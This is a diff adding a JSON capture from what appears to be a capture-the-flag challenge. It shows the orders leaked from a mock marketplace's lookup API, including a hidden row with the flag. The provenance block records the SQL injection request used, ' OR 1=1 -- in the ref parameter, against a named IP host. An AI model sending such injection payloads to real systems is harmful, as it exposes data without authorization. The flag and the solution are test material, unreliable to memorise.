@@ -1,0 +1,34 @@
+{
+  "_provenance": {
+    "host": "134.209.117.21",
+    "captured_at": "2026-06-21T17:30:42Z",
+    "via": "GET /api/orders/lookup?ref=' OR 1=1 --",
+    "note": "The status:'hidden' row carries the web3 flag. The other two never surface via the buyer-facing /api/orders endpoint either, because that filter requires status='completed'."
+  },
+  "orders": [
+    {
+      "id": "ops-ledger-9001",
+      "listingName": "CloudPwn Toolkit",
+      "price": 499.99,
+      "status": "hidden",
+      "notes": "bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}",
+      "createdAt": "2026-06-21T17:30:42.512Z"
+    },
+    {
+      "id": "escrow-2049",
+      "listingName": "Macro Builder",
+      "price": 199.99,
+      "status": "released",
+      "notes": "Released after vendor confirmation.",
+      "createdAt": "2026-06-21T17:30:42.509Z"
+    },
+    {
+      "id": "escrow-1042",
+      "listingName": "RAT Builder Pro",
+      "price": 299.99,
+      "status": "escrow-hold",
+      "notes": "Awaiting release to buyer wallet.",
+      "createdAt": "2026-06-21T17:30:42.505Z"
+    }
+  ]
+}
